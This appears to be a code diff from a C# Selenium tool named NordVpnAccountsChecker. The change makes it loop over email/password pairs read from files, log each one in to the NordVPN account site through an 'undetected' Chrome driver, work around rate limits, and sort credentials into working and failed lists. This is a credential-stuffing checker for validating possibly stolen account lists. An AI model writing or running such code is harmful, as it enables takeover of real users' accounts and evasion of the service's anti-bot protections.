@@ -1,16 +1,33 @@
 ﻿using OpenQA.Selenium;
 using NordVpnAccountsChecker.Extensions;
-using NordVpnAccountsChecker;
+using NordVpnAccountsChecker.Components;
 
-using (IWebDriver driver = ChromeDriverEx.CreateUndetectedChromeDriver())
-//using (IWebDriver driver = new ChromeDriver())
+var blacklist = new AccountsFileStorage(fileName: "_blacklist");
+blacklist.ReadAccounts();
+
+var whitelist = new AccountsFileStorage(fileName: "_whitelist");
+whitelist.ReadAccounts();
+
+var handledAccounts = blacklist.GetAccounts().Union(whitelist.GetAccounts()).DistinctBy(s => s.Key);
+
+var accounts = AccountsFileParser.ParseDirectory(relativePath: "Files");
+
+var accountsToParse = accounts
+                            .ExceptBy(handledAccounts.Select(s => s.Key), account => account.Key)
+                            .OrderBy(s => s.Key)
+                            .ToDictionary(s => s.Key, s => s.Value);
+
+var prefs = new Dictionary<string, object>()
+{
+    { "credentials_enable_service", false } // disable auth popups after login
+};
+
+using (IWebDriver driver = ChromeDriverEx.CreateUndetectedChromeDriver(prefs))
 {
     var loginUrl = "https://my.nordaccount.com/oauth2/login";
-    var login = "test";
-    var password = "test1";
     var navigateToLoginPage = true;
 
-    while (true)
+    foreach (var account in accountsToParse)
     {
         if (navigateToLoginPage)
         {
@@ -19,13 +36,26 @@ using (IWebDriver driver = ChromeDriverEx.CreateUndetectedChromeDriver())
 
         driver.HandleTooManyRequests(loginUrl);
 
-        driver.EnterLoginAndSubmit(login);
+        driver.EnterLoginAndSubmit(account.Key);
 
-        driver.EnterPasswordAndSignIn(password);
+        driver.EnterPasswordAndSignIn(account.Value);
 
         try
         {
-            driver.HandleMessage();
+            bool success = driver.HandleMessage();
+
+            if (success)
+            {
+                Console.WriteLine($"{account.Key} added to the white list");
+
+                whitelist.AddAccount(account.Key, account.Value);
+            }
+            else
+            {
+                Console.WriteLine($"{account.Key} added to the block list");
+
+                blacklist.AddAccount(account.Key, account.Value);
+            }
 
             navigateToLoginPage = true;
         }
@@ -35,8 +65,3 @@ using (IWebDriver driver = ChromeDriverEx.CreateUndetectedChromeDriver())
         }
     }
 }
-
-
-
-
-
